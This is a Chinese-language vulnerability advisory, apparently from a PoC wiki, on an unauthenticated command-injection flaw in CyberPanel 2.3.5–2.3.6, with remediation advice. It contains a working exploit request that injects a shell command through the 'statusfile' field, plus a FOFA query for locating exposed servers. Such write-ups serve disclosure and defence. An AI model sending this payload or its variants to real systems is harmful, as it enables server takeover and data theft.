# CyberPanel upgrademysqlstatus 远程命令执行漏洞(QVD-2024-44346) 

# 漏洞描述

该漏洞源于upgrademysqlstatus接口未做身份验证和参数过滤，未授权的攻击者可以通过此接口执行任意命令获取服务器权限，从而造成数据泄露、服务器被接管等严重的后果。目前该漏洞技术细节与EXP已在互联网上公开，鉴于该漏洞影响范围较大，建议用户尽快做好自查及防护。

# 影响版本

CyberPanel v2.3.5 

CyberPanel v2.3.6

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 超危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="CyberPanel"

POC/EXP：

OPTIONS /dataBases/upgrademysqlstatus HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Content-Type: application/json
Connection: close

{"statusfile":"/dev/null; ifconfig; #"}

![image-20241028193933385](./.resource/Cyber​​Panelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028193933385.png)


![image-20241028194013546](./.resource/Cyber​​Panelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028194013546.png)


影响独立资产ip15万

![image-20241028194118552](./.resource/Cyber​​Panelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028194118552.png)


# 修复方案

目前官方已有可更新版本，建议受影响用户升级至最新版本：

CyberPanel >= v2.3.7

官方下载地址：

https://github.com/usmannasir/cyberpanel/tree/v2.3.7


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
